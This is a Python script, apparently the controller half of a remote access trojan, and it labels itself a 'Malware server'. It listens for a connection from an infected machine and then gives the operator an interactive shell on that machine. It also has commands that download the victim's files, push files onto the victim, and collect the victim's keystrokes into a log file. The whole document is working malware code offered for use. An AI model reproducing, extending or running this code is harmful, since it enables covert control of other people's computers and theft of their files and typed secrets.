import socket as st
import os
from sys import argv,exit,stdout

try:
    target_ip = str(argv[1])
    port = int(argv[2])
    sock = st.socket(st.AF_INET,st.SOCK_STREAM)
    sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
    sock.bind((target_ip,port))
    sock.listen()
    print(f'Malware server starts for target : {target_ip}:{port}')
    con,addr = sock.accept()
    try:
        if con:
            os.system('clear')
            print('[*] Connection established to the target')
            while True:
                get_path = con.recv(1024).decode()
                cmd = input(f'[{get_path}]~# ')
                if not cmd:
                    continue

                elif cmd == 'clear':
                    con.send(cmd.encode())
                    os.system('clear')
                    get_path = None
                    continue

                elif 'download' in cmd:
                    con.send(cmd.encode())
                    getfile_name = cmd.split(maxsplit=1)[1]
                    try:
                        with open(getfile_name,'wb') as file:
                            while True:
                                fetch_file = con.recv(8192)
                                if not fetch_file:
                                    break
                                file.write(fetch_file)
                        print('file recieved...')
                        file.close()
                    except Exception as e:
                        print(e)

                elif cmd.startswith('push'):
                    con.send(cmd.encode())
                    split_cmd = cmd.split()
                    file_name = split_cmd[1]

                    if os.path.exists(file_name):
                        file = open(file_name,'r')
                        getcontent = file.read()
                        con.send(getcontent.encode())
                    else:
                        print(f'The file \'{file_name}\' doesn\'t exist')

                elif cmd == 'log keys':
                    con.send(cmd.encode())
                    print('start keylogger...')
                    try:
                        while True:
                            getlogs = con.recv(1024).decode()
                            with open('logger.txt','a') as log:
                                log.write(getlogs)
                    except KeyboardInterrupt:
                        log.close()
                    continue
                elif cmd == 'quite' or cmd == 'exit':
                    con.close()
                    os.system('clear')
                    sock.close()
                    print('server and target disconnected with ip : {}'.format(addr[0]))
                    exit(1)
                else:
                    con.send(cmd.encode())
                    output = con.recv(10000).decode().strip('\n').replace('-','')
                    print(output)
                    stdout.flush()
                    continue
    except ConnectionResetError:
        print(f'Target disconected with IP : {addr[0]} and PORT : {addr[1]}')   
        exit()

    except Exception as err:
        print(err)
        exit()

except Exception as error:
    if not error:
        os.system('clear')
        print('something is missing....',end='\n')
        print('<usage> : python3 server.py <target_ipaddress> <port>')
        exit()
    else:
        print(error)